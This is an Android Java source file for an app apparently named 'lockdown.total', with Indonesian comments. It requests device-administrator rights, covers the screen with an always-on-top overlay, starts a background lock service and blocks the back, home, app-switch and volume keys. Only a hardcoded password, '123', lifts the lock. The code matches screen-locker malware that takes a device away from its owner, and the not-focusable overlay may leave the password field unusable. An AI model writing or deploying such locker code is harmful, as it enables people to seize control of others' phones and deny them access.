package com.lockdown.total;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;

public class MainActivity extends Activity {
    private WindowManager wm;
    private View overlayView;
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // --- ACTIVATE DEVICE ADMIN ---
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);
        
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            startActivity(intent);
        }

        // --- LOCK PHYSICAL KEYS ---
        // Tidak bisa dimatikan sepenuhnya di Android tanpa root, tapi kita bisa override
        
        // --- OVERLAY LOCK SCREEN ---
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        showLockOverlay();
        
        // --- START SERVICE LOCK ---
        startService(new Intent(this, LockService.class));
    }

    private void showLockOverlay() {
        LayoutInflater inflater = LayoutInflater.from(this);
        overlayView = inflater.inflate(R.layout.overlay_lock, null);
        
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
            WindowManager.LayoutParams.FORMAT_TRANSLUCENT
        );
        params.gravity = Gravity.CENTER;
        
        wm.addView(overlayView, params);
        
        // Password logic
        EditText passInput = overlayView.findViewById(R.id.passInput);
        Button unlockBtn = overlayView.findViewById(R.id.unlockBtn);
        
        unlockBtn.setOnClickListener(v -> {
            if (passInput.getText().toString().equals("123")) {
                // UNLOCK - matikan semua
                stopService(new Intent(this, LockService.class));
                wm.removeView(overlayView);
                finishAffinity();
                System.exit(0);
            } else {
                Toast.makeText(this, "Password salah!", Toast.LENGTH_SHORT).show();
                passInput.setText("");
            }
        });
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        // Matikan semua tombol fisik (kecuali power)
        if (keyCode == KeyEvent.KEYCODE_BACK ||
            keyCode == KeyEvent.KEYCODE_HOME ||
            keyCode == KeyEvent.KEYCODE_APP_SWITCH ||
            keyCode == KeyEvent.KEYCODE_VOLUME_UP ||
            keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
            return true; // consumed, tidak berfungsi
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (overlayView != null && wm != null) {
            wm.removeView(overlayView);
        }
    }
          }
